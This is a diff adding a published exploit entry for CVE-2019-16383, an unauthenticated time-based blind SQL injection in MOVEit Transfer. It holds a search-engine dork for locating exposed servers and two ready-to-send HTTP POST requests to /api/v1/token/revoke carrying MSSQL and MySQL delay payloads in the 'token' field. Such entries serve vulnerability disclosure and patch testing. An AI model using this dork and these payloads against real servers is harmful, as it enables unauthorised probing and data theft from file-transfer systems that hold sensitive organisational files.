@@ -1,0 +1,34 @@
+# Exploit Title: MOVEit Transfer 11.1.1 - 'token' Unauthenticated SQL Injection 
+# Google Dork: inurl:human.aspx intext:moveit
+# Date: 2020-04-12
+# Exploit Authors: Aviv Beniash, Noam Moshe
+# Vendor Homepage: https://www.ipswitch.com/
+# Version: MOVEit Transfer 2018 SP2 before 10.2.4, 2019 before 11.0.2, and 2019.1 before 11.1.1
+# CVE : CVE-2019-16383
+# 
+# Related Resources:
+# https://community.ipswitch.com/s/article/SQL-Injection-Vulnerability
+# https://nvd.nist.gov/vuln/detail/CVE-2019-16383
+
+# Description:
+# The API call for revoking logon tokens is vulnerable to a
+# Time based blind SQL injection via the 'token' parameter
+
+# MSSQL payload:
+
+POST /api/v1/token/revoke HTTP/1.1
+Host: moveittransferstg
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 32
+
+token='; WAITFOR DELAY '0:0:10'--
+
+
+# MySQL payload:
+
+POST /api/v1/token/revoke HTTP/1.1
+Host: moveittransferstg
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 21
+
+token=' OR SLEEP(10);
